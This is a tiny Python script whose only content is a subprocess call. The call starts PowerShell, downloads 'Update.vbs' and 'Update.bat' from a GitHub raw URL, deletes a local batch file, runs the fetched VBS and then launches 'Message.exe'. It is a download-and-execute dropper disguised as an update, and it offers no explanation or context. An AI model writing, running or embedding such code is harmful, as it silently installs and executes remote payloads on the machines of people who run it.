import os
import subprocess
subprocess.Popen('powershell -command "Invoke-WebRequest https://raw.githubusercontent.com/AbdulazizDXT/Cardio/main/TestFiles/Update.vbs -OutFile Update.vbs" ; del Update.bat ; powershell -command "Invoke-WebRequest https://raw.githubusercontent.com/AbdulazizDXT/Cardio/main/TestFiles/Update.bat -OutFile Update.bat ; timeout /t 5 ; start Update.vbs ; timeout /t 5 ; timeout /t 300 ; Message.exe ; exit', shell=True)
